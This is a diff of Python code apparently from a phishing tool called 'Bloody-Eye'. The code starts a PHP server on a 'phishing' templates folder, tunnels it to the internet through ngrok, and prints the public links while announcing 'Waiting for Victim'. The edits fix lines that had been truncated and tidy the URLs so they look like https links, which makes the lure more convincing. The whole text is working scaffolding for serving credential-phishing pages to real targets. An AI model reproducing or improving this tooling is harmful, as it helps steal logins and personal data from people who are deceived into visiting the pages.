@@ -531,7 +531,7 @@ exit();""")
     def ngrokserver():
        try:
           with open("log","w") as phplog:
-             Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,st$
+             Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
           os.system("clear")
           print (Fore.BLUE+"""
 ..............
@@ -557,8 +557,8 @@ exit();""")
                                              .""")
           global token
           a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","")$
-          print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","")$
+          print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060","")
+          print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060","")
        except:
 
           with open("logs/exit","w") as kill:
@@ -593,10 +593,10 @@ exit();""")
                                              .""")  
       time.sleep(0.07)
       with open("log","w") as phplog:
-         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout$
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : http://127.0.0.1:6060$
+         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : http://127.0.0.1:6060")
       time.sleep(0.07)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim, "+Fore.BLUE+$ 
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim, "+Fore.BLUE+"Ctrl + C "+Fore.YELLOW+"to exit...")
     elif v == "02":
        ngrokserver()
     def userin():
